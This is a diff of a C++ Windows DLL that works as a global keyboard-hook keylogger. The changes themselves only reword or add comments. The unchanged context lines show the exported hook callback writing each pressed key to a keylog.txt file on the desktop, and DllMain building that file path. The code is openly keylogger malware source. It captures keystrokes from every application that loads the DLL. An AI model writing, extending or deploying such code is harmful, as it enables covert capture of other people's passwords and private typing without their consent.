@@ -13,18 +13,22 @@ wchar_t filePath[MAX_PATH];
 
 HHOOK global;
 
-//extern "C" makes a function-name in C++ have C linkage (compiler does not mangle the name) so that client C code can link to (use) your function using a C compatible header file that contains just the declaration of your function.
+// extern "C" makes a function-name in C++ have C linkage (compiler does not mangle the name) 
+// so that client C code can link to (=use) your function using a C compatible header file that contains just the declaration of your function.
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 
 		std::ofstream LogFile;
-		// Note: this should be an absolute path to make sure all applications log to the same file
-		// otherwise, each x64 application will create its own logfile at the relative path
+		// Note: this should be an absolute path to make sure each instance 
+		// of the DLL loaded by different applications log to the same file
 		LogFile.open(filePath, std::ios_base::app);
 
 		//check key up flag not set
 		if (!(HIWORD(lParam) & KF_UP)) {
 			switch (wParam) {
+
+				// Check for a complete list of virtual key codes:
+				// https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 
 				// Number keys
 			case 0x30: LogFile << "0"; break;
@@ -106,7 +110,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 	{
 	case DLL_PROCESS_ATTACH:
 	{
-		// Get the desktop folder path
+		// Get the desktop folder path (independent of the current user)
 		if (SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &desktopPath) == S_OK) {
 			// Concatenate desktop path and filename			
 			PathCombine(filePath, desktopPath, L"keylog.txt");
@@ -119,7 +123,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 	case DLL_THREAD_ATTACH:  break;
 	case DLL_THREAD_DETACH: break;
 	case DLL_PROCESS_DETACH:
-		// Free the allocated memory for the path
+		// The calling process is responsible for freeing this resource once it is no longer needed 
+		// by calling CoTaskMemFree, whether SHGetKnownFolderPath succeeds or not.
 		CoTaskMemFree(desktopPath);
 		break;
 	}
